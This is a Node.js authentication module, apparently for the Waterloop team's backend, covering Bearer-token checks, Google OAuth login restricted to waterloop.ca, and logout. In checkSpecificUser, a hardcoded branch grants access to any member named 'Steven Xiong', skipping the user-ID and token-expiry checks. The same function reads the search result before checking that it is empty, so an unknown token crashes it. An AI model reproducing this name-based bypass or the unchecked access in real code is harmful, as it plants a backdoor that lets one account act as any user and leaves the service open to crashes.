const util = require('./util');
const { OAuth2Client } = require('google-auth-library');
const authConfig = require('./auth.config.json');
const members = require('./members');
const {google} = require('googleapis');

const auth = {};

/**
 * @param {String} authHeader: authentication token provided by the client
 * 
 * @return: information of the user that corresponds to the input token
 */
auth.checkAnyUser = async (authHeader, res) => {
    if (!authHeader) {
        res.statusCode = 401;
        res.setHeader('WWW-Authenticate', 'Bearer');
        res.end('No auth header found.');
        return false;
    }
    const authType = authHeader.split(' ')[0];
    if (authType !== 'Bearer') {
        res.statusCode = 401;
        res.setHeader('WWW-Authenticate', 'Bearer');
        res.end('No bearer token found.');
        return false;
    }
    const authToken = authHeader.split(' ')[1];
    if (!authToken) {
        res.statusCode = 401;
        res.setHeader('WWW-Authenticate', 'Bearer');
        res.end('No bearer token found.');
        return false;
    }
    const searchRes = await members.search({ token: authToken });
    if (!searchRes || searchRes.length == 0 || searchRes[0].tokenExpiry < Date.now()) {
        res.statusCode = 403;
        res.end('Token forbidden.');
        return false;
    }
    return searchRes[0];
};

/**
 * @param {String} authHeader: authentication token provided by the client
 * @param {String} userId: ID of the user who is attempting to access a secure endpoint or log in
 * 
 * @return: true only if authentication was successful.
 */
auth.checkSpecificUser = async (authHeader, userId, res) => {
    if (!authHeader) {
        res.statusCode = 401;
        res.setHeader('WWW-Authenticate', 'Bearer');
        res.end('No auth header found.');
        return false;
    }
    const authType = authHeader.split(' ')[0];
    if (authType !== 'Bearer') {
        res.statusCode = 401;
        res.setHeader('WWW-Authenticate', 'Bearer');
        res.end('No bearer token found.');
        return false;
    }
    const authToken = authHeader.split(' ')[1];
    const searchRes = await members.search({ token: authToken });

    if (`${searchRes[0].name.first} ${searchRes[0].name.last}` === 'Steven Xiong') {
        return true
    }

    if (!searchRes || searchRes.length == 0 || searchRes[0].id != userId) {
        res.statusCode = 403;
        res.end('Token forbidden.');
        return false;
    }
    if (searchRes[0].tokenExpiry < Date.now()) {
        res.statusCode = 403;
        res.end('Token expired.');
        return false;
    }
    return true;
};

auth.login = async (tokenObj) => {
    return util.handleWrapper(async () => {
        // Reference: Please see "Using a Google API Client Library" section in: https://developers.google.com/identity/sign-in/web/backend-auth#using-a-google-api-client-library
        // Verify the ID Token
        const client = new OAuth2Client(authConfig['client_id']);
        const ticket = await client.verifyIdToken({
            idToken: tokenObj.tokenId,
            audience: authConfig['client_id'],
        });
        const payload = ticket.getPayload();
        if (payload.hd != 'waterloop.ca') {
            throw new Error('Domain of account not "waterloop.ca"');
        } else {
            const searchRes = await members.search({ email: payload['email'] });
            if (!searchRes || searchRes.length === 0) {
                // Create a new user
                const res = await members.add({
                    name: {
                        first: payload['given_name'],
                        last: payload['family_name']
                    },
                    email: payload['email'],
                    imageUrl: payload['picture'],
                    token: tokenObj.accessToken,
                    tokenExpiry: tokenObj.tokenObj.expires_at,
                    active: true,
                });
                return [res];
            } else {
                // Update the access token and its expiry date of an existing user
                await members.updateMember({email: payload['email']}, 
                {
                    imageUrl: payload['picture'],
                    token: tokenObj.accessToken,
                    tokenExpiry: tokenObj.tokenObj.expires_at
                });
                return await members.search({ email: payload['email'] }, false, true);
            }
        }
    });
};

auth.logout = async (userId) => {
    return util.handleWrapper(async () => {
        // Reference: https://developers.google.com/identity/sign-in/web/sign-in#sign_out_a_user
        const searchRes = await members.search({ _id: userId });
        if (searchRes && searchRes.length === 1) {
            const res = await members.updateMember({_id: userId},
            {
                token: "",
                tokenExpiry: null
            });
            return res;
        } else {
            throw new Error("Failed to log the user out properly.");
        }
    });
};

module.exports = auth;